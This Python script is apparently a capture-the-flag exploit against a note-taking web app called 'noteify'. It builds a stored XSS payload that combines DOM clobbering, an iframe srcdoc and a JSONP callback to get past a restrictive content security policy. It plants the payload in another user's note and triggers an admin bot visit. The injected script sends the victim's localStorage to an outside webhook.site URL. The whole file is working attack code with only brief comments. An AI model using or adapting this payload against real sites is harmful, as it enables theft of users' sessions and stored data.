import httpx
from base64 import b64encode
import uuid
from html import escape
from urllib.parse import quote_plus


URL = "http://noteify.intechfest.cc"
WEBHOOK = "https://webhook.site/0d2413b8-0783-4b96-aa31-a78bbe0fc6bd"


class Api:
    def __init__(self, username=None, password=None, url=URL):
        self.session = httpx.Client()
        self.url = url
        if username and password:
            self.auth = b64encode(f"{username}:{password}".encode()).decode()
        else:
            self.auth = None

    def urljoin(self, path):
        return httpx.URL(self.url).join(path)

    def auth_as(self, username, password):
        res = self.session.post(self.urljoin("api/register"), json={
            "username": username,
            "password": password
        })
        self.auth = b64encode(f"{username}:{password}".encode()).decode()
        return res.text

    def addnote(self, json):
        res = self.session.post(self.urljoin("api/addnote"), json=json, headers={
            "Authorization": f"Bearer {self.auth}"
        })
        return res

    def getnote(self, id):
        res = self.session.get(self.urljoin(f"api/getnote/{id}"), headers={
            "Authorization": f"Bearer {self.auth}"
        })
        return res.text


def escapev2(input_string, quote=False):
    html_entities = escape(input_string, quote)
    html_entities = html_entities.replace('?', '&quest;')
    return html_entities


def makepayload(script):
    script = quote_plus(script)
    # use JSONP endpoint to bypass csp default-src 'self';
    srcdoc = escapev2(
        f'<script src="{URL}/api/healthcheck?callback={script}//"></script>',
        quote=True
    )
    # Wrap the script with iframe, so it will be executed
    iframe = escape(f"<iframe srcdoc='{srcdoc}'></iframe>")
    # Use dom clobbering
    domclobering = f"""<a id=config ><a id=config name=default-content href="cid:{iframe}">"""
    return domclobering


if __name__ == "__main__":
    api = Api()
    api.auth_as("foobarfoobar", "foobarfoobar")
    myuuid = uuid.uuid1().__str__()
    payload = makepayload(f"""
    parent.location.replace(`{WEBHOOK}?`+JSON.stringify(localStorage))
    """.strip())
    res = api.addnote({
        "id": myuuid,
        "title": myuuid,
        "content": payload,
        "ownerid": 1  # owner id of dimas
    })
    print("Payload:", payload)
    print("UUID:", myuuid)
    res = httpx.post(
        url=httpx.URL(URL).join("/report/visit"),
        data={"noteId": myuuid},
        timeout=100
    )
    print(res.text)
